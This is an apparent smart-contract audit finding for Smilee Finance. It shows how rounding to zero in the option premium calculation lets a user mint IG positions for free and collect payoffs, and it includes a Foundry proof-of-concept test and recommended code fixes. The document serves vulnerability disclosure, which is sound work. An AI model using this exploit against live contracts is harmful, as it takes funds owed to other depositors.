Cheesy Blood Goblin

high

# User can mint free IG positions and collect free payoffs

## Summary

User can mint IG positions for free and collect payoffs, whereby other users are harmed. This also brings the underlying vault into an unbalanced position.

## Vulnerability Detail

### `FinanceIGPrice.getMarketValue()` returns 0

First issue is present in the [`FinanceIGPrice.getMarketValue()` function](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGPrice.sol#L407-L423) which is called during the mint process in `DVP._mint()` to determine the premium the user needs to pay in exchange for the IG positions. 


Market value is calculated as `marketValue_ = 2 * (amountUp * priceUp + amountDown * priceDown) / theta;`, where `priceUp, priceDown and theta` parameters are not controlled by the user. User can only select `amountUp` and `amountDown` parameters. If they are selected in a way that `2 * (amountUp * priceUp + amountDown * priceDown)` equation will be **STRICTLY LESS** than `theta`, the final result equals zero (because `1/2 = 0` in integer world of Solidity). 

Consequently, a user pays 0 premium for the non-zero position he mints. After the mint process, a user needs to wait for the current epoch to finish. After he can initiates the burn process, during which he receives a payoff free-of-charge. In the end, user spent 0 tokens and received >0 tokens, while other users are harmed as they receive less payoff than they should.

### Optimistic delta hedging

Second issue is related to the delta hedging process that occurs during the `DVP._mint()` procedure. The `DVP` optimistically executes the [`IG._deltaHedgePosition()`](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/DVP.sol#L151-L156) even though no tokens were yet sent to the vault at this point. After the delta hedge and premium calculation functions to transfer fees and premiums to the vault and fee manager are executed. 

And [here](https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/DVP.sol#L172-L178) lies the issue related to the free mints described above. During the free mint process, no base tokens are transferred to the vault and fee manager. This means even though the `IG._deltaHedgePosition()` already assumed a base token balance increase and correctly executed the hedge, the actual increase doesn't happen, leaving the vault in an unbalanced state.

## Impact

If the user carefully selects the amount of an IG position to mint, it can achieve this position can be minted for free. When the epoch is rolled over and only the payoffs remain, the user can collect free rewards which should go to other users who paid for their positions.

Additionally, when such free mint occurs it brings the underlying vault into an unbalanced position because delta hedging is executed even though no tokens were transferred to the vault. 

## Code Snippet

To replicate the problem, add the following test function to the `test/IG.t.sol` file. All of the required changes are already contained within the test function.

```solidity
function test_IG_deposit_withdrawal_exploit_and_vault_imbalance() public {
    // No need to provide any tokens to the exploiter, since we will artificially increase the IG positions without any actual
    // balance transfers.

    address exploiter = vm.addr(123456789);

    // 1. Mint IG position
    uint256 amountUp = 5e2;
    uint256 currentEpoch = ig.getEpoch().current;
    uint256 currentStrikPrice = ig.currentStrike();
    {
        uint256 vaultBalanceBeforeMint = ERC20(baseToken).balanceOf(address(vault));
        uint256 exploiterBalanceBeforeMint = ERC20(baseToken).balanceOf(exploiter);

        // Mint
        vm.prank(exploiter);
        ig.mint(exploiter, 0, amountUp, 0, 0, 0, 0);

        // BUG 1:
        // Vault balance after mint increases even though no actual balance transfer has happened
        // The increase happens because of _deltaHedgePosition() call.
        uint256 vaultBalanceAfterMint = ERC20(baseToken).balanceOf(address(vault));

        // BUG 2:
        // Exploiter balance doesn't change, but the IG position is increased for free
        uint256 exploiterBalanceAfterMint = ERC20(baseToken).balanceOf(exploiter);
        (uint256 amountMint, bool strategyMint, uint256 strikeMint, uint256 epochMint) = ig.positions(Position.getID(exploiter, currentStrikPrice));

        console2.log("---------------------------------------------------------");
        console2.log("MINT");
        console2.log("Vault balance BEFORE: ", vaultBalanceBeforeMint);
        console2.log("Vault balance AFTER: ", vaultBalanceAfterMint);

        console2.log("Exploiter balance BEFORE: ", exploiterBalanceBeforeMint);
        console2.log("Exploiter balance AFTER: ", exploiterBalanceAfterMint);

        console2.log("Exploiter position amount: ", amountMint);
        console2.log("Exploiter position strategy: ", strategyMint);
        console2.log("Exploiter position strike: ", strikeMint);
        console2.log("Exploiter position epoch: ", epochMint);
    }

    // 2. Roll epoch and update oracle price
    // We are assuming oracle price increased during epoch, so the CALL IG position has earned some payoff.
    //
    // To maximize gains the exploiter will try to guess if sideToken price will increase or decrease during the next epoch,
    // and position accordingly (if price will appreciate it makes sense to buy CALL option, otherwise PUT).
    // If he guesses correctly he will earn double the amount.
    // If he plays safe and positions 50:50, he will earn reward only for the correct position.
    //
    // It is critical for the exploiter to wait for current epoch end, so the following line is called in DVP._burn():
    // Amount memory payoff_ = _liquidity[expiry].shareOfPayoff(strike, amount, _baseTokenDecimals);
    // This skips, the IG._getMarketValue() where the issue is present.
    {
        vm.startPrank(admin);
            Utils.skipDay(true, vm);
            // Increase sideToken price by 10%, so the IPriceOracle(_getPriceOracle()).getPrice(sideToken, baseToken)
            // also increases, yielding in a profit for the IG CALL position.
            TestnetPriceOracle(ap.priceOracle()).setTokenPrice(vault.sideToken(), 1.1e18);
            ig.rollEpoch();
        vm.stopPrank();
    }

    // 3. Burn IG position
    {
        uint256 vaultBalanceBeforeBurn = ERC20(baseToken).balanceOf(address(vault));
        uint256 exploiterBalanceBeforeBurn = ERC20(baseToken).balanceOf(exploiter);

        // Burn
        vm.prank(exploiter);
        ig.burn(currentEpoch, exploiter, currentStrikPrice, amountUp, 0, 0, 0);

        uint256 vaultBalanceAfterBurn = ERC20(baseToken).balanceOf(address(vault));
        uint256 exploiterBalanceAfterBurn = ERC20(baseToken).balanceOf(exploiter);
        (uint256 amountBurn, bool strategyBurn, uint256 strikeBurn, uint256 epochBurn) = ig.positions(Position.getID(exploiter, currentStrikPrice));

        console2.log("---------------------------------------------------------");
        console2.log("BURN");
        console2.log("Vault balance BEFORE: ", vaultBalanceBeforeBurn);
        console2.log("Vault balance AFTER: ", vaultBalanceAfterBurn);

        console2.log("Exploiter balance BEFORE: ", exploiterBalanceBeforeBurn);
        console2.log("Exploiter balance AFTER: ", exploiterBalanceAfterBurn);

        console2.log("Exploiter position amount: ", amountBurn);
        console2.log("Exploiter position strategy: ", strategyBurn);
        console2.log("Exploiter position strike: ", strikeBurn);
        console2.log("Exploiter position epoch: ", epochBurn);

        // 4. Calculate profit of exploiter and vault loss
        uint256 exploiterProfit = exploiterBalanceAfterBurn - exploiterBalanceBeforeBurn;
        int256 vaultLoss = int256(vaultBalanceAfterBurn) - int256(vaultBalanceBeforeBurn);

        console2.log("---------------------------------------------------------");
        console2.log("Exploiter profit: ", exploiterProfit);
        console2.log("Vault loss: ", vaultLoss);
    }
}
```

## Tool used

Manual Review

## Recommendation

### `FinanceIGPrice.getMarketValue()` returns 0

Immediately return 0 if `amountUp == 0 && amountDown == 0`,  revert if `unwrapped marketValue_`  <= 0 in `FinanceIGPrice.getMarketValue()`:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGPrice.sol#L407-L423

```solidity
function getMarketValue(
    uint256 theta,
    uint256 amountUp,
    uint256 priceUp,
    uint256 amountDown,
    uint256 priceDown,
    uint8 decimals
) public view returns (uint256 marketValue_) {
    // amountUp = 0 && amountDown = 0 => marketValue = 0
    if(amountUp == 0 && amountDown == 0) {
        return 0;
    }

    amountUp = AmountsMath.wrapDecimals(amountUp, decimals);
    amountDown = AmountsMath.wrapDecimals(amountDown, decimals);

    // igP multiplies a notional computed as follow:
    // V0 * user% = V0 * amount / initial(strategy) = V0 * amount / (V0/2) = amount * 2
    // (amountUp * (2 priceUp)) + (amountDown * (2 priceDown))
    marketValue_ = 2 * (amountUp * priceUp + amountDown * priceDown) / theta;
    uint256 unwrapped = AmountsMath.unwrapDecimals(marketValue_, decimals);

    // amountUp > 0 || amountDown > 0 => marketValue > 0
    require(unwrapped > 0, "Invalid state - market value equals 0");

    return unwrapped;
}
``` 


### Optimistic delta hedging

Add vault balance validation and check that the base token balance increases on the vault contract in `DVP._mint()`:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/DVP.sol#L172-L178

```solidity
// Get fees from sender:
uint256 vaultBalanceBefore = IERC20Metadata(baseToken).balanceOf(vault);

IERC20Metadata(baseToken).safeTransferFrom(msg.sender, address(this), fee - vaultFee);
IERC20Metadata(baseToken).safeApprove(address(feeManager), fee - vaultFee);
feeManager.receiveFee(fee - vaultFee);

// Get base premium from sender:
IERC20Metadata(baseToken).safeTransferFrom(msg.sender, vault, premium_ + vaultFee);
feeManager.trackVaultFee(address(vault), vaultFee);

uint256 vaultBalanceAfter = IERC20Metadata(baseToken).balanceOf(vault);
require(vaultBalanceAfter > vaultBalanceBefore, "Vault balance not transferred correctly");
```









